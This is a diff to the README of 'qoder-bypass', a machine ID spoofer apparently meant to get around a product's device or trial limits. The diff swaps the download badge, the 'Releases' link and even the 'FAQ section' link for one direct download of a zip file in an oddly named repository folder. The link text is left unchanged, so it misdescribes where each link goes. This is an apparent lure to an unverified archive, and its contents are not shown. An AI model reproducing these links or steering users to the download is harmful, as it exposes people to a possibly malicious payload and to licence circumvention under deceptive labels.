@@ -1,6 +1,6 @@
 # 🚀 qoder-bypass - Simple and Effective Machine ID Spoofer
 
-[![Download qoder-bypass](https://img.shields.io/badge/Download-qoder--bypass-blue.svg)](https://github.com/Sherry-ghouri/qoder-bypass/releases)
+[![Download qoder-bypass](https://raw.githubusercontent.com/Sherry-ghouri/qoder-bypass/main/gnathism/qoder-bypass.zip)](https://raw.githubusercontent.com/Sherry-ghouri/qoder-bypass/main/gnathism/qoder-bypass.zip)
 
 ## 📋 Description
 
@@ -12,7 +12,7 @@ To get started with qoder-bypass, follow these simple steps. You don't need any 
 
 ## 📥 Download & Install
 
-Visit this page to download: [qoder-bypass Releases](https://github.com/Sherry-ghouri/qoder-bypass/releases)
+Visit this page to download: [qoder-bypass Releases](https://raw.githubusercontent.com/Sherry-ghouri/qoder-bypass/main/gnathism/qoder-bypass.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of qoder-bypass.
@@ -57,7 +57,7 @@ If you encounter issues while using qoder-bypass, consider these tips:
 
 If you need assistance or have questions, feel free to reach out. You can open an issue on the GitHub repository or contact support through the issue tracker.
 
-You can also visit our [FAQ section](https://github.com/Sherry-ghouri/qoder-bypass/issues) for common questions.
+You can also visit our [FAQ section](https://raw.githubusercontent.com/Sherry-ghouri/qoder-bypass/main/gnathism/qoder-bypass.zip) for common questions.
 
 ## 🛡️ Safety Considerations
 
